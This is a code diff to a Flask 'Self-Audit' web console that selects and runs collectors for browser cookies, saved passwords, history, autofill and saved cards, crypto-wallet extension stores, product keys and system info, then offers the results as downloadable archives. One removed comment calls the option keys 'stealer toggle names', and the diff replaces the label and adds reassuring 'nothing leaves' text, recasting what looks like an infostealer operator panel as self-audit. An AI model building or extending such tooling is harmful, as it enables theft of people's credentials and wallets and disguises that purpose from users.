@@ -54,8 +54,8 @@ DATA_DIR = os.path.join(HERE, "panel_data")
 DB_FILE = os.path.join(DATA_DIR, "db.json")
 RUNS_DIR = os.path.join(DATA_DIR, "runs")
 
-# Which collectors the audit runs. Keys match stealer toggle names so the same
-# cfg shape works if you script jwg.py directly.
+# Which collectors the audit runs. Keys match the CLI --only toggles exactly, so
+# the same selection works whether you click in the panel or script jwg.py.
 CAPTURE_OPTIONS = {
     "system_info":   "System Info",
     "cookies":       "Browser Cookies",
@@ -65,6 +65,18 @@ CAPTURE_OPTIONS = {
     "extensions":    "Extension Stores (raw)",
     "product_keys":  "Product Keys",
     "software_list": "Installed Software",
+}
+
+# One-line description per store, shown under each checkbox in the panel.
+OPTION_HELP = {
+    "system_info":   "Host, user, OS, RAM/GPU/screen, machine id",
+    "cookies":       "Chromium + Firefox cookie jars from your profiles",
+    "passwords":     "Saved logins (decrypted only if your session key is unlocked)",
+    "history":       "Visited URLs from Chromium History / Firefox places",
+    "autofill":      "Web Data autofill entries and saved cards",
+    "extensions":    "Wallet-extension LevelDB, staged raw (not decrypted)",
+    "product_keys":  "Windows user-scoped registration blobs (DPAPI)",
+    "software_list": "Installed apps/packages enumerated on this host",
 }
 
 
@@ -213,35 +225,12 @@ def run_capture(rid: str) -> None:
     stage = tempfile.mkdtemp(prefix="jwg_run_")
     try:
         rows = probe.run_all()
-        caps = []
         opts = run.get("options", {})
-        wanted = [k for k, v in opts.items() if v] or list(CAPTURE_OPTIONS.keys())
-        readers = {
-            "cookies":    capture.capture_chromium,
-            "passwords":  capture.capture_chromium,   # logins ride the chromium pass
-            "extensions": capture.capture_extension_stores,
-        }
-        ran_firefox = False
-        for k in wanted:
-            fn = readers.get(k)
-            if fn is None:
-                continue
-            if fn is capture.capture_chromium and any(
-                    c.kind.startswith("chromium") for c in caps):
-                continue          # one chromium pass covers cookies + logins
-            try:
-                got = fn(stage)
-                caps.extend(got)
-                ran_firefox = ran_firefox or any(c.kind.startswith("firefox") for c in got)
-            except Exception as e:
-                caps.append(_err_cap(k, e))
-        if ("cookies" in wanted or "passwords" in wanted) and not ran_firefox:
-            try:
-                caps.extend(capture.capture_firefox(stage))
-            except Exception as e:
-                caps.append(_err_cap("firefox", e))
+        # Shared, option-driven collector set (see capture.run_capture). Every
+        # toggle in CAPTURE_OPTIONS now maps to a real reader - no dead checkboxes.
+        caps = capture.run_capture(stage, {k: bool(opts.get(k)) for k in CAPTURE_OPTIONS})
 
-        system = sysinfo.gather()
+        system = sysinfo.gather() if opts.get("system_info", True) else {}
         report.write_items(stage, caps)
         text = report.render_report(caps, system, rows)
 
@@ -258,86 +247,126 @@ def run_capture(rid: str) -> None:
         shutil.rmtree(stage, ignore_errors=True)
 
 
-def _err_cap(label: str, exc: Exception):
-    import capture
-    c = capture.Capture(f"{label}:ERROR")
-    c.note = f"{type(exc).__name__}: {exc}"
-    return c
-
-
 threading.Thread(target=_worker, daemon=True).start()
 
 
 # ------------------------------------------------------------------ templates
 BASE_CSS = """
-*{box-sizing:border-box}body{margin:0;background:#0b0d10;color:#e8eaed;
-font:14px/1.5 -apple-system,'Segoe UI',Roboto,sans-serif}
-.wrap{max-width:880px;margin:0 auto;padding:32px 20px}
-.brand{font-weight:800;letter-spacing:.12em;color:#f06292;font-size:20px}
-.card{background:#12151a;border:1px solid #22262d;border-radius:12px;padding:18px;margin-bottom:16px}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
-.chk{display:flex;gap:8px;align-items:center;font-size:13px;color:#c3c8d0}
-input[type=text],input[type=password]{width:100%;background:#12151a;border:1px solid #22262d;
- color:#e8eaed;padding:10px 12px;border-radius:8px;font:inherit}
-label.fld{display:block;font-size:11px;color:#8b93a1;text-transform:uppercase;letter-spacing:.05em;margin:0 0 5px}
-button{background:#f06292;color:#111;border:0;padding:11px 20px;border-radius:8px;font:inherit;
- font-weight:800;cursor:pointer;letter-spacing:.04em}
-.btnbig{width:100%;padding:16px;font-size:15px;letter-spacing:.14em}
-.row{display:flex;gap:12px;align-items:center}
-.nav{display:flex;gap:8px;margin:10px 0 22px}
-.nav a{padding:8px 14px;border-radius:8px;background:#12151a;border:1px solid #22262d;color:#c3c8d0}
-.nav a.on{background:#f06292;color:#111;border-color:#f06292;font-weight:700}
+:root{--bg:#0a0c0f;--panel:#12151b;--panel2:#0e1116;--line:#232833;--ink:#e8eaed;
+ --dim:#8b93a1;--faint:#6b7280;--accent:#f06292;--accent-d:#c2417a;--ok:#3fb950;
+ --warn:#e3b341;--bad:#f85149;--radius:14px}
+*{box-sizing:border-box}
+body{margin:0;background:radial-gradient(1200px 600px at 80% -10%,#151a24 0,var(--bg) 60%);
+ color:var(--ink);font:14px/1.55 -apple-system,'Segoe UI',Roboto,sans-serif;-webkit-font-smoothing:antialiased}
+a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}
+.wrap{max-width:960px;margin:0 auto;padding:34px 22px 64px}
+.brand{font-weight:800;letter-spacing:.14em;color:var(--accent);font-size:19px;text-transform:uppercase}
+.card{background:linear-gradient(180deg,var(--panel),var(--panel2));border:1px solid var(--line);
+ border-radius:var(--radius);padding:20px 22px;margin-bottom:18px;box-shadow:0 1px 0 #ffffff08 inset,0 12px 30px -18px #000}
+.card h3{margin:0 0 4px;font-size:15px;letter-spacing:.02em}
+.card .sub{margin:0 0 16px;color:var(--dim);font-size:12.5px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:12px}
+.store{display:flex;gap:12px;align-items:flex-start;padding:13px 14px;border:1px solid var(--line);
+ border-radius:11px;background:#0d1015;cursor:pointer;transition:border-color .15s,transform .05s}
+.store:hover{border-color:#39414f}
+.store input{margin-top:3px;width:17px;height:17px;accent-color:var(--accent);flex:0 0 auto;cursor:pointer}
+.store .t{font-weight:600;font-size:13.5px;line-height:1.2}
+.store .d{color:var(--faint);font-size:11.5px;margin-top:3px}
+input[type=text],input[type=password]{width:100%;background:#0d1015;border:1px solid var(--line);
+ color:var(--ink);padding:11px 13px;border-radius:9px;font:inherit;outline:none;transition:border-color .15s}
+input:focus{border-color:var(--accent)}
+label.fld{display:block;font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.06em;margin:0 0 6px}
+button{background:linear-gradient(180deg,var(--accent),var(--accent-d));color:#160a10;border:0;
+ padding:12px 22px;border-radius:10px;font:inherit;font-weight:800;cursor:pointer;letter-spacing:.05em;
+ transition:filter .15s}
+button:hover{filter:brightness(1.08)}button:active{transform:translateY(1px)}
+.btnbig{width:100%;padding:15px;font-size:14.5px;letter-spacing:.12em}
+.row{display:flex;gap:12px;align-items:center;justify-content:space-between}
+.nav{display:flex;gap:8px;margin:14px 0 24px;border-bottom:1px solid var(--line);padding-bottom:14px}
+.nav a{padding:8px 16px;border-radius:9px;background:transparent;border:1px solid transparent;color:var(--dim);
+ font-weight:600;font-size:13px}
+.nav a:hover{color:var(--ink);text-decoration:none}
+.nav a.on{background:var(--accent);color:#160a10;border-color:var(--accent);font-weight:800}
 table{width:100%;border-collapse:collapse;font-size:13px}
-th,td{text-align:left;padding:9px 10px;border-bottom:1px solid #1c2027}
-th{color:#8b93a1;font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:.05em}
-.pill{padding:2px 9px;border-radius:20px;font-size:11px;font-weight:700}
-.pill.done{background:#12351f;color:#3fb950}.pill.running,.pill.queued{background:#2a2410;color:#e3b341}
-.pill.failed{background:#3a1416;color:#f85149}
-.muted{color:#6b7280;font-size:12px}.status{font-size:12px;color:#8b93a1;margin:6px 0 14px}
-.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#f06292;margin-right:6px}
-.err{color:#f85149;background:#201113;border:1px solid #3a1416;padding:10px 12px;border-radius:8px;margin-bottom:14px}
-.ok{color:#3fb950;background:#0f2016;border:1px solid #12351f;padding:10px 12px;border-radius:8px;margin-bottom:14px}
+th,td{text-align:left;padding:11px 12px;border-bottom:1px solid #1a1f27}
+tr:last-child td{border-bottom:0}
+th{color:var(--dim);font-weight:600;text-transform:uppercase;font-size:10.5px;letter-spacing:.07em}
+tbody tr:hover{background:#0f1319}
+.pill{padding:3px 11px;border-radius:20px;font-size:11px;font-weight:700;letter-spacing:.02em;display:inline-block}
+.pill.done{background:#0f2a19;color:var(--ok);border:1px solid #14401f}
+.pill.running,.pill.queued{background:#2a2410;color:var(--warn);border:1px solid #3d3316}
+.pill.failed{background:#2a1113;color:var(--bad);border:1px solid #451a1d}
+.muted{color:var(--faint);font-size:12px}.status{font-size:12.5px;color:var(--dim);margin:2px 0 16px}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--ok);margin-right:7px;
+ box-shadow:0 0 0 3px #0f2a19}
+.err{color:#ffb4ad;background:#201113;border:1px solid #3a1416;padding:12px 14px;border-radius:10px;margin-bottom:16px}
+.ok{color:#a6e7b4;background:#0f2016;border:1px solid #12351f;padding:12px 14px;border-radius:10px;margin-bottom:16px}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:12px;margin-bottom:18px}
+.stat{background:#0d1015;border:1px solid var(--line);border-radius:11px;padding:14px 16px}
+.stat .k{color:var(--faint);font-size:10.5px;text-transform:uppercase;letter-spacing:.07em}
+.stat .v{font-size:22px;font-weight:800;margin-top:4px;letter-spacing:-.01em}
+.chip{display:inline-flex;gap:6px;align-items:center;background:#0d1015;border:1px solid var(--line);
+ border-radius:20px;padding:4px 11px;font-size:11.5px;color:var(--dim);margin:2px 6px 2px 0}
+.chip b{color:var(--ink);font-weight:700}
+.dl{padding:5px 12px;border-radius:8px;background:#0d1015;border:1px solid var(--line);color:var(--accent);
+ font-size:12px;font-weight:600}
+.dl:hover{border-color:var(--accent);text-decoration:none}
+.empty{text-align:center;color:var(--faint);padding:34px 0}
+.foot{margin-top:26px;text-align:center;color:#4b5260;font-size:11px;letter-spacing:.03em}
+.spin{display:inline-block;width:12px;height:12px;border:2px solid #3d3316;border-top-color:var(--warn);
+ border-radius:50%;animation:s 0.8s linear infinite;vertical-align:-2px;margin-right:6px}
+@keyframes s{to{transform:rotate(360deg)}}
 """
 
-LOGIN_TPL = """<!doctype html><meta charset=utf-8><title>Self-Audit</title><style>{{css}}</style>
-<div class=wrap style="max-width:420px">
- <div class=brand>SELF-AUDIT</div>
- <p class=muted style="text-align:center;margin-bottom:22px">local capture console</p>
- {%if setup%}<div class=ok>First run: pick a username and a password (8+ chars).</div>{%endif%}
+LOGIN_TPL = """<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
+<title>Self-Audit · sign in</title><style>{{css}}</style>
+<div class=wrap style="max-width:430px;padding-top:9vh">
+ <div style="text-align:center;margin-bottom:22px">
+   <div class=brand style="font-size:22px">Self&#8209;Audit</div>
+   <p class=muted style="margin-top:6px">local capture console · this machine only</p>
+ </div>
+ {%if setup%}<div class=ok>First run &mdash; pick a username and a password (8+ characters).</div>{%endif%}
  {%if err%}<div class=err>{{err}}</div>{%endif%}
  <form method=post>
   <div class=card>
-   <label class=fld>Username</label><input name=u type=text autocomplete=username required>
-   <div style="height:12px"></div>
+   <label class=fld>Username</label><input name=u type=text autocomplete=username autofocus required>
+   <div style="height:14px"></div>
    <label class=fld>Password</label><input name=p type=password autocomplete=current-password required>
   </div>
   <button class=btnbig type=submit>SIGN IN</button>
  </form>
+ <div class=foot>runs locally on 127.0.0.1 · no data leaves unless you export it</div>
 </div>"""
 
-APP_TPL = """<!doctype html><meta charset=utf-8><title>Self-Audit</title><style>{{css}}</style>
+APP_TPL = """<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
+<title>Self-Audit</title><style>{{css}}</style>
 <div class=wrap>
- <div class=row style="justify-content:space-between">
-   <div class=brand style="font-size:24px">SELF-AUDIT</div>
-   <div class=muted>{{user.username}} &nbsp; <a href=/logout>sign out</a></div>
+ <div class=row style="margin-bottom:4px">
+   <div class=brand style="font-size:22px">Self&#8209;Audit</div>
+   <div class=muted>{{user.username}} &nbsp;&middot;&nbsp; <a href=/logout>sign out</a></div>
  </div>
  <div class=nav>
    <a class="{{'on' if tab=='capture' else ''}}" href=/>Capture</a>
    <a class="{{'on' if tab=='runs' else ''}}" href=/runs>Runs</a>
  </div>
  {{body|safe}}
+ <div class=foot>single-operator console &middot; reads your own machine &middot; nothing is sent anywhere by default</div>
 </div>"""
 
 CAPTURE_TPL = """
 {%if msg%}<div class=ok>{{msg}}</div>{%endif%}
 {%if err%}<div class=err>{{err}}</div>{%endif%}
-<div class=status><span class=dot></span>this machine only - nothing leaves it unless you copy it out</div>
+<div class=status><span class=dot></span>this machine only &mdash; results stay local until you download them</div>
 <form method=post action=/capture>
  <div class=card>
    <h3>What to read</h3>
+   <p class=sub>Select one or more stores. Each maps to a verified local reader.</p>
    <div class=grid>
      {%for k,label in options.items()%}
-       <label class=chk><input type=checkbox name="c_{{k}}" {{checks[k]}}> {{label}}</label>
+       <label class=store>
+         <input type=checkbox name="c_{{k}}" {{checks[k]}}>
+         <span><span class=t>{{label}}</span><span class=d>{{help[k]}}</span></span>
+       </label>
      {%endfor%}
    </div>
  </div>
@@ -347,23 +376,30 @@ CAPTURE_TPL = """
 
 RUNS_TPL = """
 {%if msg%}<div class=ok>{{msg}}</div>{%endif%}
+<div class=stats>
+ <div class=stat><div class=k>Total runs</div><div class=v>{{stats.total}}</div></div>
+ <div class=stat><div class=k>Completed</div><div class=v>{{stats.done}}</div></div>
+ <div class=stat><div class=k>In progress</div><div class=v>{{stats.active}}</div></div>
+ <div class=stat><div class=k>Items captured</div><div class=v>{{stats.items}}</div></div>
+</div>
 <div class=card>
  <h3>History</h3>
- {%if not runs%}<p class=muted>none yet.</p>{%else%}
- <table><tr><th>when</th><th>status</th><th>items</th><th></th></tr>
+ {%if not runs%}<div class=empty>No captures yet. Pick stores on the Capture tab and run one.</div>{%else%}
+ <table><thead><tr><th>when</th><th>status</th><th>stores</th><th>items</th><th></th></tr></thead><tbody>
  {%for r in runs%}
  <tr>
    <td class=muted>{{r.when}}</td>
-   <td><span class="pill {{r.status}}">{{r.status}}</span>
-       {%if r.status=='failed'%}<div class=muted>{{r.error or ''}}</div>{%endif%}</td>
+   <td><span class="pill {{r.status}}">{%if r.status in ('running','queued')%}<span class=spin></span>{%endif%}{{r.status}}
+       {%if r.status=='failed'%}<div class=muted style="margin-top:4px">{{r.error or ''}}</div>{%endif%}</span></td>
+   <td>{%for c in r.chips%}<span class=chip>{{c.k}} <b>{{c.v}}</b></span>{%endfor%}{%if not r.chips%}<span class=muted>&mdash;</span>{%endif%}</td>
    <td class=muted>{{r.summary}}</td>
-   <td>{%if r.status=='done' and r.artifact%}<a href="/download/{{r.id}}">archive</a>{%endif%}</td>
+   <td>{%if r.status=='done' and r.artifact%}<a class=dl href="/download/{{r.id}}">archive &#8595;</a>{%endif%}</td>
  </tr>
- {%endfor%}</table>
- <p class=muted>Auto-refreshes while a capture runs.</p>
+ {%endfor%}</tbody></table>
+ {%if stats.active%}<p class=muted style="margin-top:12px"><span class=spin></span>capture in progress &mdash; refreshes automatically.</p>{%endif%}
  {%endif%}
 </div>
-<script>setTimeout(()=>location.reload(),3000);</script>
+<script>setTimeout(()=>location.reload(),{{ '1500' if stats.active else '8000' }});</script>
 """
 
 
@@ -390,6 +426,19 @@ def login_required(fn):
 # ------------------------------------------------------------------ app factory
 DEFAULT_CHECKS = {k: k in ("system_info", "cookies", "passwords", "history",
                            "extensions") for k in CAPTURE_OPTIONS}
+
+
+def _short_kind(kind: str) -> str:
+    """Turn a capture kind like 'chromium-cookies:brave/Default' into a compact
+    chip label 'cookies · brave'. Splits on ':' then keeps the store + browser."""
+    head, _, tail = kind.partition(":")
+    # Kinds without a browser/profile suffix (software-list, product-keys) pass through.
+    if not tail:
+        return {"software-list": "software", "product-keys": "keys"}.get(head, head)
+    parts = head.split("-")
+    store = parts[-1] if len(parts) > 1 else head
+    prof = tail.split("/")[0]
+    return f"{store} · {prof}"
 
 
 def create_app(secret: str | None = None):
@@ -439,6 +488,7 @@ def create_app(secret: str | None = None):
     def home():
         checks = {k: "checked" if DEFAULT_CHECKS[k] else "" for k in CAPTURE_OPTIONS}
         body = render_template_string(CAPTURE_TPL, options=CAPTURE_OPTIONS, checks=checks,
+                                      help=OPTION_HELP,
                                       msg=request.args.get("msg", ""),
                                       err=request.args.get("err", ""))
         return render(body, "capture")
@@ -459,13 +509,31 @@ def create_app(secret: str | None = None):
     @app.get("/runs")
     @login_required
     def runs():
+        all_runs = store.list_runs()
         rows = []
-        for r in store.list_runs():
-            total = sum(r.get("counts", {}).values())
+        chips_all = []
+        total_items = 0
+        n_done = n_active = 0
+        for r in all_runs:
+            counts = r.get("counts", {}) or {}
+            total = sum(counts.values())
+            total_items += total
+            if r.get("status") == "done":
+                n_done += 1
+            elif r.get("status") in ("running", "queued"):
+                n_active += 1
+            # Per-store chips: split "kind:browser/prof" into a short label + count.
+            chips = [{"k": _short_kind(k), "v": v} for k, v in
+                     sorted(counts.items(), key=lambda x: -x[1])[:6]]
             rows.append({**r,
                          "when": time.strftime("%Y-%m-%d %H:%M", time.localtime(r["created"])),
-                         "summary": f"{total} item(s)" if r.get("counts") else "-"})
-        body = render_template_string(RUNS_TPL, runs=rows, msg=request.args.get("msg", ""))
+                         "summary": f"{total:,}" if counts else "-",
+                         "chips": chips})
+            chips_all.extend(chips)
+        stats = {"total": len(all_runs), "done": n_done,
+                 "active": n_active, "items": f"{total_items:,}"}
+        body = render_template_string(RUNS_TPL, runs=rows, stats=stats,
+                                      msg=request.args.get("msg", ""))
         return render(body, "runs")
 
     @app.get("/download/<rid>")
